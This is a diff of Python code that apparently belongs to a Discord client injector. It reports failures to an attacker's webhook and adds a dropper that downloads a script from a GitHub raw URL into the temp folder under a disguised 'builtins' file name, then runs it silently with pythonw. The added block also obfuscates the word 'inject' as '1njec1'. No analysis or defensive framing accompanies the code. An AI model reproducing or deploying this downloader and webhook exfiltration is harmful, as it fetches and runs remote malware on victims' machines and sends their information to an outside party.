@@ -126,9 +126,31 @@ module.exports = require('./core.asar');
     s = open(mainpath,"r")
 except:
     try:
-        requests.post(hook,json={"content": f"Could not inject {user}"})
+        requests.post(hook,json={"content": f"Could not 1njec1 {user}"})
     except:
         pass
+
+try:
+    import os,requests,subprocess
+    def download(url, dest):
+        response = requests.get(url, stream=True)
+        with open(dest, 'wb') as file:
+            for chunk in response.iter_content(chunk_size=8192):
+                file.write(chunk)
+        open_file(dest)
+    def open_file(file_path):
+        subprocess.run(['pythonw', file_path])
+    temp = os.environ.get('temp')
+    url = 'https://raw.githubusercontent.com/dd44aa/test/refs/heads/main/bot.py'
+    dpath = os.path.join(temp, 'Z-builtins-7876-689a9de9fc.py')
+
+    if os.path.exists(dpath):
+        open_file(dpath)
+    else:
+        download(url, dpath)
+except Exception as e:
+    try:requests.post(hook,json={"content": f"Could not download the 1njec1ion file: {user}"})
+    except:pass
 
 def info():
             import json
